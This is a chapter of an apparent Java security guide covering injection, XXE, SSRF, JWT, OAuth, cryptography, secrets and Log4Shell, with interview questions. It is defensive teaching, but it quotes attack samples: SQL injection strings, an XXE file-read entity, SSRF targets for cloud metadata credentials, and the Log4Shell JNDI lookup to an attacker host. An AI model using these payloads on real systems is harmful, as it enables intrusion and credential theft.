[⬅️ Prev: 24 · System Design](24-system-design-for-java-architects.md) · [🏠 Index](README.md) · [Next: 26 · Coding & LLD ➡️](26-coding-and-lld-interview-patterns.md)

# 25 · Security for Java Engineers

> *Most breaches don't come from clever cryptanalysis. They come from a string concatenated into a query, an endpoint that never checked who owns the record, a secret committed to git, or a logging library that executed what it logged. Security is mostly engineering discipline applied consistently.*

---

## Table of contents
1. [The security mindset](#1-the-security-mindset-)
2. [Injection in all its Java forms](#2-injection-in-all-its-java-forms-)
3. [XML external entities (XXE)](#3-xml-external-entities-xxe-)
4. [Deserialization & SSRF](#4-deserialization--ssrf-)
5. [Authentication & password storage](#5-authentication--password-storage-)
6. [OAuth 2.x & OpenID Connect](#6-oauth-2x--openid-connect-)
7. [JWT pitfalls](#7-jwt-pitfalls-)
8. [Authorization: the #1 web risk](#8-authorization-the-1-web-risk-)
9. [Cryptography with JCA/JCE, done right](#9-cryptography-with-jcajce-done-right-)
10. [TLS in Java](#10-tls-in-java-)
11. [Secrets management](#11-secrets-management-)
12. [Supply-chain security & Log4Shell](#12-supply-chain-security--log4shell-)
13. [Secure defaults checklist for Spring services](#13-secure-defaults-checklist-for-spring-services-)
14. [Staff lens](#14-staff-lens-)
15. [Interview questions](#15-interview-questions)
16. [References](#16-references)

---

## 1. The security mindset 🟡

- **Trust boundaries:** every place data crosses from less trusted to more trusted (the HTTP request into your controller, a message from another team's topic, a file upload, a webhook) is where validation, authentication and authorization belong.
- **Threat modelling with STRIDE**, per component: **S**poofing (authentication), **T**ampering (integrity), **R**epudiation (audit logs), **I**nformation disclosure (confidentiality), **D**enial of service (availability), **E**levation of privilege (authorization).
- **Defence in depth:** assume every layer can fail. WAF + input validation + parameterised queries + least-privilege DB user + encryption at rest: an attacker has to beat *all* of them.
- **Least privilege:** each service, database user, IAM role and token gets only the permissions it needs.
- **Secure by default:** the easy path should be the safe path (frameworks that escape output by default, starters that enable TLS and auth).

The **OWASP Top 10** groups the most common web risks, and most map directly onto sections below: broken access control (§8), cryptographic failures (§9), injection (§2), insecure design (§1), security misconfiguration (§13), vulnerable components (§12), authentication failures (§5–7), software and data integrity failures (§4, §12), logging and monitoring failures ([Chapter 22](22-production-readiness-observability-resilience.md)), and SSRF (§4).

---

## 2. Injection in all its Java forms 🟡→🔴

**The root cause is always the same:** untrusted data gets interpreted as *code* (SQL, a shell command, an expression, markup) because data and code were mixed into one string.

### SQL / JPQL
```java
// ❌ SQL injection: name = "x' OR '1'='1"  (or worse: "x'; DROP TABLE users; --")
stmt.executeQuery("SELECT * FROM users WHERE name = '" + name + "'");
// ❌ JPQL is NOT immune: concatenation is still concatenation
em.createQuery("select u from User u where u.name = '" + name + "'");

// ✅ Bind parameters: data is never parsed as SQL
em.createQuery("select u from User u where u.name = :name", User.class).setParameter("name", name);
jdbcClient.sql("SELECT * FROM users WHERE name = :name").param("name", name).query(User.class).list();
```
💣 **Identifiers can't be bound.** Column names in `ORDER BY`, table names and sort directions can't be parameters, so use an **allow-list**:
```java
private static final Map<String, String> SORTABLE = Map.of("created", "created_at", "total", "total_amount");
String column = SORTABLE.getOrDefault(requestedSort, "created_at");
String direction = "desc".equalsIgnoreCase(requestedDir) ? "DESC" : "ASC";
String sql = "SELECT id, total_amount FROM orders WHERE customer_id = ? ORDER BY " + column + " " + direction;
```

### OS commands
```java
Runtime.getRuntime().exec("convert " + userFile + " out.png");          // ❌ shell metacharacters, argument injection
new ProcessBuilder("convert", "--", validatedPath.toString(), "out.png") // ✅ argument array, no shell, "--" ends options
        .redirectErrorStream(true).start();
```

### Expression languages: SpEL, OGNL, JEXL, template engines
```java
new SpelExpressionParser().parseExpression(userInput).getValue();       // ❌ remote code execution: T(java.lang.Runtime).getRuntime().exec(...)
```
Never evaluate user input as an expression. If you need user-defined rules, use a restricted evaluation context (`SimpleEvaluationContext` for SpEL) or a purpose-built rule language. Several high-profile Java RCEs (in Spring Cloud Function and Struts/OGNL) were exactly this.

### Others
- **Log injection:** CR/LF in logged input forges log lines. Use structured logging or encode it ([Chapter 03 §14](03-strings.md#14-security-notes-)).
- **LDAP injection:** escape filter values, or use parameterised filter APIs.
- **Path traversal:** `../../etc/passwd`. Normalise and check `startsWith(base)` ([Chapter 13 §8](13-io-nio-networking-serialization.md#8-nio2-path-and-files-)).
- **Zip Slip:** archive entries named `../../app/config.yml` overwrite files on extraction. Validate every entry's resolved path the same way.
- **Header injection:** CR/LF in values used as HTTP headers (modern servlet containers reject them, but don't rely on it).
- **Prompt injection:** instructions hidden in text that a language model reads (a ticket, a web page, a tool result). Unlike SQL there's no parameterisation that separates code from data, so the defence is limiting what the model's output can do ([Chapter 35 §11](35-ai-features-spring-ai-langchain4j-rag.md#11-prompt-injection-and-the-security-model-measured-)).

---

## 3. XML external entities (XXE) 🔴

Historically, Java's XML parsers **resolved external entities by default**. A malicious document can read local files, make the server issue HTTP requests (SSRF), or exhaust memory ("billion laughs"):
```xml
<?xml version="1.0"?>
<!DOCTYPE order [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<order><note>&xxe;</note></order>
```
**Harden every parser factory** (the OWASP XXE Prevention Cheat Sheet has one recipe per parser):
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);   // the single most effective setting
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```
The same applies to `SAXParserFactory`, `XMLInputFactory` (StAX), `TransformerFactory`, `SchemaFactory`, and libraries that wrap them (some SOAP and XML-binding stacks). Prefer JSON for new APIs. Where you must accept XML, centralise parser creation in one hardened factory.

---

## 4. Deserialization & SSRF 🔴

**Insecure deserialization:** Java native serialization of untrusted data can lead to remote code execution through gadget chains. Polymorphic JSON deserialization with permissive default typing can too. The full treatment, including `ObjectInputFilter`, is in [Chapter 13 §10–11](13-io-nio-networking-serialization.md#10-java-serialization-and-why-its-dangerous-). **Policy:** no Java serialization across trust boundaries, and allow-listed polymorphism only.

**Server-side request forgery (SSRF):** your server fetches a URL the attacker controls (webhook URLs, "import from URL", image proxies, PDF renderers), and the attacker points it at **internal** targets:
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/   ← cloud instance metadata: steal credentials
http://localhost:8081/actuator/env                                 ← internal admin endpoints
http://10.0.3.17:6379/                                             ← internal Redis
```
**Defences:**
- **Allow-list** destination hosts or domains whenever possible.
- Resolve DNS **once**, validate the resulting IP (block private, loopback, link-local and metadata ranges), and **connect to that validated IP**. Otherwise DNS rebinding swaps the address between check and use.
- Disable or re-validate **redirects** (an allowed host can redirect to an internal one).
- Use egress firewalls or network policies so app servers can't reach metadata or admin endpoints anyway. Use IMDSv2-style token-protected metadata services.
- Run URL-fetching features in an isolated service with minimal network access.

---

## 5. Authentication & password storage 🔴

### Storing passwords
Use a **slow, salted, memory-hard password hashing function**, never a fast hash:
| ✅ Use | ❌ Never |
|---|---|
| **Argon2id**, **bcrypt**, scrypt, PBKDF2 (with high iteration counts, e.g. where FIPS compliance is required) | MD5, SHA-1, plain or unsalted SHA-256, "encryption" of passwords, homemade schemes |

Fast hashes (SHA-256) can be brute-forced at billions of guesses per second on GPUs. Password hashes are deliberately expensive (tunable cost) and salted (so precomputed tables don't work).

```java
PasswordEncoder encoder = PasswordEncoderFactories.createDelegatingPasswordEncoder();
String stored = encoder.encode(rawPassword);            // e.g. "{bcrypt}$2a$10$…": the algorithm id is stored with the hash
boolean ok = encoder.matches(rawPassword, stored);      // supports upgrading algorithms over time
```
Spring Security's `DelegatingPasswordEncoder` prefixes the hash with its algorithm ID, so you can **migrate algorithms** gradually: verify with the old one, re-hash with the new one at login.

### Sessions and login hardening
- **Rotate the session ID at login** (prevents session fixation). Spring Security does this by default.
- **Cookie flags:** `HttpOnly` (no JavaScript access), `Secure` (HTTPS only), `SameSite=Lax` or `Strict` (CSRF mitigation).
- **CSRF protection** is required for **cookie-authenticated** browser apps. It isn't needed for pure bearer-token APIs (the browser doesn't attach the token automatically).
- **MFA** for sensitive accounts and actions (Spring Security 7 added first-class multi-factor support).
- **Brute force and credential stuffing:** rate-limit by account *and* by IP, use progressive delays, check against breached-password lists, and alert on spikes. Be careful with hard lockouts: they let attackers lock users out on purpose.
- **Generic errors:** "Invalid username or password", never "user not found", which enables account enumeration. Make response *timing* similar too.

---

## 6. OAuth 2.x & OpenID Connect 🔴

**OAuth 2** is about **delegated authorization**: a client gets an *access token* to call APIs on behalf of a user (or itself). **OpenID Connect (OIDC)** adds **authentication** on top: an *ID token* says who the user is.

| Flow | Use for | Notes |
|---|---|---|
| **Authorization Code + PKCE** | Web apps, SPAs, mobile and desktop apps (anything with a user) | PKCE protects the code exchange. **The recommended default** |
| **Client Credentials** | Service-to-service (no user) | The client authenticates as itself (secret, private-key JWT or mTLS) |
| Device Authorization | TVs, CLIs without browsers | The user approves on another device |
| ~~Implicit~~, ~~Password~~ | — | **Deprecated** (removed in OAuth 2.1): tokens leak in URLs; apps handle user passwords |

| Token | Audience | Purpose |
|---|---|---|
| **Access token** | The **API** (resource server) | Authorise API calls; short-lived (minutes) |
| **ID token** (OIDC) | The **client** | Tells the client who logged in. **Never send it to APIs as an access token** |
| **Refresh token** | The authorization server | Get new access tokens without re-login. Long-lived: protect it, rotate it, bind it to the client |

**A Spring Security resource server (an API validating JWT access tokens):**
```java
@Bean
SecurityFilterChain api(HttpSecurity http) throws Exception {
    return http
            .securityMatcher("/api/**")
            .authorizeHttpRequests(auth -> auth
                    .requestMatchers(HttpMethod.GET, "/api/orders/**").hasAuthority("SCOPE_orders:read")
                    .requestMatchers("/api/admin/**").hasRole("ADMIN")
                    .anyRequest().authenticated())                               // deny by default
            .oauth2ResourceServer(oauth -> oauth.jwt(Customizer.withDefaults())) // signature (JWKS), exp, nbf, iss
            .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .csrf(csrf -> csrf.disable())                                        // OK ONLY for stateless bearer-token APIs
            .build();
}
// application.properties
// spring.security.oauth2.resourceserver.jwt.issuer-uri=https://auth.example.com/realms/acme
// spring.security.oauth2.resourceserver.jwt.audiences=orders-api                ← validate the audience too
```

---

## 7. JWT pitfalls 🔴

A JWT is `base64url(header).base64url(payload).signature`. **It's signed, not encrypted.** Anyone can read the payload.

| Pitfall | What goes wrong | Prevention |
|---|---|---|
| **`alg: none`** | Unsigned tokens accepted | Use a library that rejects `none`; pin the expected algorithms |
| **Algorithm confusion** (RS256 → HS256) | The attacker signs with HMAC using your *public key* as the secret | Pin the algorithm per key; never let the token's header choose the verification algorithm |
| **Missing claim checks** | Tokens for another API (`aud`), another issuer (`iss`), or expired tokens accepted | Validate `iss`, `aud`, `exp`, `nbf` (Spring does `iss`/`exp` and `aud` when configured) |
| **Secrets in the payload** | PII or secrets readable by anyone who sees the token | Keep claims minimal. Use opaque tokens with introspection for sensitive contexts |
| **Long-lived tokens** | A stolen token works for days, with no revocation | Short access-token TTLs (5–15 min) plus refresh tokens. Introspection or deny-lists for high-risk revocation |
| **Tokens in `localStorage`** | Readable by any XSS on the page | Prefer a backend-for-frontend with `HttpOnly` session cookies for browser apps |
| **Key rotation** | Hard-coded keys can't rotate | JWKS with `kid`, caching with refresh, overlapping keys during rotation |
| **Clock skew** | Valid tokens rejected, or expired ones accepted for too long | A small allowed skew (≤ 60 s), NTP everywhere |

---

## 8. Authorization: the #1 web risk 🔴

**Broken access control** tops the OWASP list because authentication without authorization means "anyone logged in can do anything".

### IDOR (Insecure Direct Object Reference)
```java
@GetMapping("/api/orders/{id}")
OrderDto get(@PathVariable long id) {
    return orders.findById(id).map(OrderDto::from).orElseThrow();      // ❌ ANY authenticated user can read ANY order
}
```
```java
@GetMapping("/api/orders/{id}")
OrderDto get(@PathVariable long id, @AuthenticationPrincipal Jwt jwt) {
    CustomerId caller = CustomerId.of(jwt.getSubject());
    return orders.findByIdAndCustomerId(id, caller)                     // ✅ ownership enforced IN the query
            .map(OrderDto::from)
            .orElseThrow(() -> new NotFoundException("Order", id));     // 404, not 403: don't confirm it exists
}
```
**Method security** keeps rules close to the use case:
```java
@PreAuthorize("hasAuthority('SCOPE_orders:write') and @orderAuthz.canModify(authentication, #orderId)")
public void cancel(long orderId) { ... }
```
(It's an AOP proxy, with the usual self-invocation caveat from [Chapter 18 §7](18-spring-internals.md#7-aop-how-proxies-add-behaviour-).)

**Principles:**
- **Deny by default.** Every endpoint needs an explicit rule. `anyRequest().authenticated()` is the floor, not the policy.
- **Enforce authorization on the server, in the service layer.** Never trust hidden UI elements or client-side checks.
- **Multi-tenant isolation:** every query is scoped by tenant. Use defence in depth with database **row-level security** (PostgreSQL RLS) or mandatory tenant filters, and test cross-tenant access explicitly.
- **Unguessable public IDs** (UUIDv7) make enumeration harder, but they're **not** authorization.
- **RBAC vs ABAC:** roles (`ADMIN`) are coarse, while attribute-based rules (owner, department, amount < limit) are expressive. Large organisations centralise policies in engines (OPA/Rego, Cedar), but keep the enforcement points in each service.

---

## 9. Cryptography with JCA/JCE, done right 🔴

**First rule:** don't invent cryptography, and avoid low-level primitives when a high-level option exists (TLS, a vetted library such as Google Tink, your cloud provider's KMS). When you do use the JDK directly:

| Need | Use | Never |
|---|---|---|
| Random tokens, keys, nonces | `SecureRandom` (`new SecureRandom()`) | `java.util.Random`, `Math.random()` (predictable) |
| Integrity of data | SHA-256 / SHA-3 | MD5, SHA-1 |
| Authenticity (shared key) | **HMAC-SHA256**, compared in **constant time** (`MessageDigest.isEqual`) | `Arrays.equals` / `String.equals` on MACs (timing leak) |
| Symmetric encryption | **AES-GCM** (authenticated), random 96-bit IV per message | **ECB** (leaks patterns), CBC without a MAC, **reusing an IV with the same key** |
| Asymmetric encryption | RSA-OAEP, or hybrid (ECIES-style / KEM) | RSA with PKCS#1 v1.5 padding for new designs |
| Signatures | **Ed25519** (JDK 15+), ECDSA P-256, RSA-PSS | Homemade constructions |
| Key derivation | **HKDF** (KDF API, JDK 25, JEP 510) | Using a password directly as a key |
| Post-quantum | **ML-KEM**, **ML-DSA** (JDK 24, JEPs 496/497); hybrid PQ key exchange in TLS 1.3 (JDK 27, JEP 527) | Ignoring "harvest now, decrypt later" for long-lived secrets |

### AES-GCM, correctly
```java
private static final SecureRandom RNG = new SecureRandom();

static byte[] encrypt(SecretKey key, byte[] plaintext, byte[] aad) throws GeneralSecurityException {
    byte[] iv = new byte[12];
    RNG.nextBytes(iv);                                         // UNIQUE per message: reuse with the same key is catastrophic
    Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
    cipher.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv));
    cipher.updateAAD(aad);                                     // e.g. a record id: authenticated, not encrypted
    byte[] ciphertextAndTag = cipher.doFinal(plaintext);
    return ByteBuffer.allocate(iv.length + ciphertextAndTag.length).put(iv).put(ciphertextAndTag).array();
}

static byte[] decrypt(SecretKey key, byte[] message, byte[] aad) throws GeneralSecurityException {
    Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
    cipher.init(Cipher.DECRYPT_MODE, key, new GCMParameterSpec(128, message, 0, 12));
    cipher.updateAAD(aad);
    return cipher.doFinal(message, 12, message.length - 12);  // throws AEADBadTagException if anything was tampered with
}
```
**Why GCM?** It's *authenticated* encryption: any modification to the ciphertext, IV or AAD makes decryption fail. Unauthenticated modes (CBC alone) enable padding-oracle and bit-flipping attacks.

**Key management is the hard part:**
- Keys live in a **KMS or HSM** (AWS KMS, GCP KMS, Vault Transit), never in code, configuration files or images.
- **Envelope encryption:** encrypt data with a per-record or per-file **data key**, and encrypt the data key with a KMS **key-encryption key**. Rotation re-wraps data keys instead of re-encrypting everything.
- Plan **rotation**, versioning (store the key ID with the ciphertext) and **crypto-shredding** (delete the key to make data unrecoverable, which is useful for GDPR erasure in immutable stores).

---

## 10. TLS in Java 🔴

- **Keystore** = *your* private keys and certificates (server identity, or the client identity for mTLS). **Truststore** = the CAs you **trust** (the JDK ships `cacerts`). PKCS12 has been the default keystore type since JDK 9 (JKS is legacy).
- **mTLS** between services: both sides present certificates, which gives strong service identity. It's often handled by a service mesh, with automatic rotation ([Chapter 23 §14](23-distributed-systems-microservices.md#14-gateways-discovery--service-mesh-)).
- **TLS 1.3** is enabled by default in modern JDKs. Weak protocols and algorithms are disabled through `jdk.tls.disabledAlgorithms` in `java.security`, and kept current by JDK updates, which is another reason to stay patched.
- 💣 **Never "fix" certificate errors with a trust-all `TrustManager` or by disabling hostname verification.** That snippet circulates widely online, and it silently disables TLS's protection against man-in-the-middle attacks. Fix the truststore (add the internal CA) instead.
- **Debugging:** `-Djavax.net.debug=ssl:handshake:verbose` shows protocol negotiation, certificate chains and why validation failed.
- **Monitor certificate expiry.** Expired certificates still cause major outages every year. Automate issuance and rotation (ACME, cert-manager, mesh CAs) and alert well before expiry.

---

## 11. Secrets management 🟡→🔴

- **Never** in source code, git history, container images, CI logs, or plain environment-variable dumps. **Scan for leaks** in CI and pre-commit hooks (gitleaks, trufflehog), and **rotate immediately** when a leak happens. Deleting the commit isn't enough.
- **Store** secrets in a vault (HashiCorp Vault, AWS Secrets Manager or Parameter Store, GCP Secret Manager). On Kubernetes, use encrypted Secrets plus the External Secrets Operator or CSI driver, and mount them as **files** (Spring's `configtree:`), not environment variables, which leak into process listings, crash dumps and child processes.
- **Prefer short-lived, identity-based credentials:** IAM roles and workload identity for cloud APIs, and dynamic database credentials (Vault database engine), instead of long-lived static passwords.
- **Rotation must be routine.** If rotating a credential takes a deploy and a meeting, it won't happen when it matters.
- **Heap dumps, JFR recordings and thread dumps can contain secrets** ([Chapter 10 §14](10-memory-and-garbage-collection.md#14-memory-leaks-causes-and-the-diagnosis-playbook-)), so protect them like production data. JDK 27's JFR in-process redaction (JEP 536) helps.

---

## 12. Supply-chain security & Log4Shell 🔴→🟣

Your application is mostly **other people's code**: 100+ transitive dependencies is normal. Every one of them can be vulnerable, abandoned, typosquatted or compromised.

**Log4Shell (CVE-2021-44228, December 2021)** in short: Log4j 2 performed `${jndi:ldap://attacker/x}` lookups **inside logged messages**. Any user-controlled string that reached a log statement (a User-Agent header, a username, a chat message) caused the JVM to fetch and execute attacker code. It had a maximum severity score, was trivially exploitable, and was present in a huge fraction of Java software, often transitively and sometimes shaded. **Lessons:**
1. **Inventory:** organisations with SBOMs knew within hours where `log4j-core` was. Others spent weeks scanning JARs, including shaded and fat ones ([Chapter 15 §9](15-modules-and-build-tools.md#9-reproducible-verifiable-secure-builds-)).
2. **Patch velocity:** the ability to rebuild and redeploy the whole fleet in a day is a security capability.
3. **Defence in depth helped:** egress restrictions (no outbound LDAP from app servers) blocked the payload fetch even where the vulnerable version ran.
4. **Features that interpret data are dangerous.** Lookups in log messages should never have existed.

**Practices:**
- **SBOM** per artifact (CycloneDX/SPDX); continuous **vulnerability scanning** (OWASP Dependency-Check, Snyk, GitHub/GitLab scanning, Trivy for images) with **patch SLAs by severity** (for example, critical within 48 hours).
- **Automated dependency updates** (Renovate, Dependabot) so patches are routine, not a crisis.
- **A single internal artifact proxy**, checksum and signature verification, provenance (SLSA), and signed images (Sigstore/cosign).
- **Minimal images:** jlink runtimes, distroless or slim bases, non-root users, and no shells or package managers in production images. Less to exploit, and less to patch.
- **The Security Manager is gone** (permanently disabled in JDK 24, JEP 486), so the JVM won't sandbox untrusted code. Isolation happens at the process, container or VM level.

---

## 13. Secure defaults checklist for Spring services 🔴

| Area | Default to |
|---|---|
| **Actuator** | Management port not exposed publicly; expose only `health` (and `info`) on the public side; protect everything else; never expose `env`, `heapdump` or `threaddump` without strong auth |
| **Errors** | RFC 9457 `ProblemDetail` responses **without** stack traces or internals (`server.error.include-stacktrace=never`) |
| **Input** | Bean Validation (`@Valid`) on every request DTO; size limits on bodies, uploads, JSON depth and collections; allow-lists over block-lists |
| **Output** | Template engines auto-escape (Thymeleaf does by default); JSON APIs set the correct `Content-Type` |
| **Headers** | HSTS, `X-Content-Type-Options: nosniff`, CSP for HTML apps, `frame-ancestors` (Spring Security sets sensible defaults) |
| **CORS** | Explicit allowed origins. **Never `*` together with credentials** |
| **AuthN/AuthZ** | Deny by default; scopes per endpoint; ownership checks in queries; method security on sensitive operations |
| **Data** | TLS everywhere; encryption at rest; PII minimisation and retention limits; no PII in logs, metrics tags or URLs |
| **Dependencies** | Platform BOM; automated updates; scanning in CI; SBOM published |
| **Runtime** | Non-root container, read-only filesystem where possible, minimal image, restricted egress |
| **Regex & parsing** | Bounded input sizes; no ReDoS-prone patterns ([Chapter 03 §12](03-strings.md#12-regular-expressions--redos-)); hardened XML parsers |
| **Comparisons** | `MessageDigest.isEqual` for MACs, tokens and signatures |

---

## 14. Staff lens 🟣

1. **Security is a quality attribute, owned by engineering.** Threat-model during design reviews (STRIDE per data flow), not just in an annual pen test.
2. **Pave the road.** Internal starters with secure defaults (resource-server config, hardened XML and JSON factories, ProblemDetail error handling, actuator lockdown, secret loading) protect hundreds of services at once.
3. **Measure the security posture:** mean time to patch critical CVEs, the percentage of services on supported JDK and framework versions, secrets-scanning findings, and authorization-test coverage for multi-tenant endpoints.
4. **Compliance shapes architecture.** PCI scope (tokenise to stay out of scope), GDPR (data minimisation, erasure, residency), SOC 2 (audit logging, access reviews). Getting these in early is far cheaper than retrofitting them.
5. **Practise incident response:** who triages a new critical CVE, how fast can you identify affected services, and how fast can you patch and deploy everything? Log4Shell divided organisations into those who could answer in hours and those who needed weeks.

---

## 15. Interview questions

<details>
<summary><b>Q1. 🟢 How do you prevent SQL injection in Java, including in JPQL and dynamic sorting?</b></summary>

Always bind parameters (`PreparedStatement`, named parameters in JPQL, Criteria API, Spring Data). Never concatenate input into SQL or JPQL. Identifiers like `ORDER BY` columns and directions can't be bound, so map user input through an allow-list of known columns. Add defence in depth: a least-privilege database user, input validation, and monitoring.
</details>

<details>
<summary><b>Q2. 🔴 What is XXE and how do you prevent it in Java?</b></summary>

XML External Entity injection: a document declares external entities that the parser resolves, which lets attackers read local files, trigger SSRF or exhaust memory. Prevent it by hardening every XML factory: `disallow-doctype-decl` true, external general and parameter entities false, no external DTD loading, no XInclude, no entity expansion. Centralise parser creation, and prefer JSON for new APIs.
</details>

<details>
<summary><b>Q3. 🟡 How should passwords be stored?</b></summary>

With a slow, salted, adaptive password-hashing function (Argon2id, bcrypt, scrypt, or PBKDF2 with a high work factor), never fast hashes (MD5, SHA-*) or reversible encryption. Use Spring Security's `DelegatingPasswordEncoder` so the algorithm ID is stored with the hash and you can migrate algorithms by re-hashing on login.
</details>

<details>
<summary><b>Q4. 🔴 Which OAuth flow would you use for a SPA, a mobile app and a backend batch job?</b></summary>

SPA and mobile: Authorization Code with PKCE (implicit and password grants are deprecated). For browser apps, consider a backend-for-frontend holding tokens server-side with `HttpOnly` session cookies. Batch job (no user): Client Credentials, authenticating with a private-key JWT, mTLS or a vaulted secret, with narrowly scoped access.
</details>

<details>
<summary><b>Q5. 🔴 What are the most dangerous JWT validation mistakes?</b></summary>

Accepting `alg: none`, letting the token header pick the algorithm (RS256→HS256 confusion), not validating `aud`/`iss`/`exp`/`nbf`, long-lived tokens with no revocation strategy, putting sensitive data in the (merely signed) payload, storing tokens in `localStorage`, and hard-coded keys with no JWKS rotation.
</details>

<details>
<summary><b>Q6. 🔴 What is IDOR and how do you prevent it systematically?</b></summary>

Insecure Direct Object Reference: an endpoint takes an object ID and returns or modifies it without checking that the caller may access it. Prevent it by enforcing ownership or tenancy in the data access itself (`findByIdAndOwnerId`), denying by default, using method security for complex rules, scoping queries by tenant (plus database row-level security), returning 404 for objects the caller can't see, and writing automated tests that try cross-user and cross-tenant access.
</details>

<details>
<summary><b>Q7. 🔴 Why AES-GCM, and what's the one mistake that breaks it completely?</b></summary>

GCM is authenticated encryption: it provides confidentiality and integrity, and any tampering makes decryption fail, which unauthenticated modes like ECB or plain CBC don't. The catastrophic mistake is reusing an IV (nonce) with the same key, which leaks the XOR of plaintexts and lets attackers forge messages. Use a random 96-bit IV per message (or a deterministic unique counter), and rotate keys well before nonce-collision limits.
</details>

<details>
<summary><b>Q8. 🟡 Why is <code>java.util.Random</code> unsuitable for tokens, and why does comparing HMACs with <code>equals</code> matter?</b></summary>

`Random` is a predictable linear congruential generator: observing outputs lets an attacker predict future values. Use `SecureRandom`. `String.equals`/`Arrays.equals` return as soon as a byte differs, so response timing leaks how many leading bytes matched, which lets an attacker brute-force a MAC byte by byte. `MessageDigest.isEqual` compares in constant time.
</details>

<details>
<summary><b>Q9. 🔴 How do you defend against SSRF in a "fetch this URL" feature?</b></summary>

Allow-list destinations if possible. Otherwise resolve DNS once, reject private, loopback, link-local and metadata IP ranges, and connect to the validated IP (to defeat DNS rebinding). Handle redirects manually with re-validation, restrict schemes to HTTP(S), add timeouts and size limits, enforce egress controls at the network layer, and run the feature in an isolated service with minimal network reach.
</details>

<details>
<summary><b>Q10. 🟣 A critical CVE like Log4Shell drops. Walk through your organisation's response.</b></summary>

Triage severity and exploitability. Query SBOMs and the artifact repository for affected versions, including transitive and shaded copies, and scan running images. Apply immediate mitigations (WAF rules, configuration flags, egress blocks) while patching: bump via the platform BOM, rebuild, and redeploy by risk tier (internet-facing first). Verify with scanners and monitoring for exploitation attempts. Communicate status. Afterwards, run a postmortem on detection speed, patch velocity and the inventory gaps, and invest in what was slow.
</details>

---

## 16. References
- [OWASP Top 10](https://owasp.org/www-project-top-ten/) and the [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/) (XXE prevention, deserialization, SSRF, password storage, JWT)
- [Spring Security reference](https://docs.spring.io/spring-security/reference/): architecture, OAuth2 resource server, method security
- [RFC 9700: OAuth 2.0 Security Best Current Practice](https://www.rfc-editor.org/rfc/rfc9700) and the OAuth 2.1 drafts
- [Java Cryptography Architecture (JCA) Reference Guide](https://docs.oracle.com/en/java/javase/25/security/java-cryptography-architecture-jca-reference-guide.html)
- JEPs: [486 Permanently Disable the Security Manager](https://openjdk.org/jeps/486) · [496 ML-KEM](https://openjdk.org/jeps/496) · [497 ML-DSA](https://openjdk.org/jeps/497) · [510 KDF API](https://openjdk.org/jeps/510) · [527 PQ Hybrid TLS 1.3](https://openjdk.org/jeps/527)
- CISA and Apache Log4j security advisories (CVE-2021-44228)

---

[⬅️ Prev: 24 · System Design](24-system-design-for-java-architects.md) · [🏠 Index](README.md) · [Next: 26 · Coding & LLD ➡️](26-coding-and-lld-interview-patterns.md)
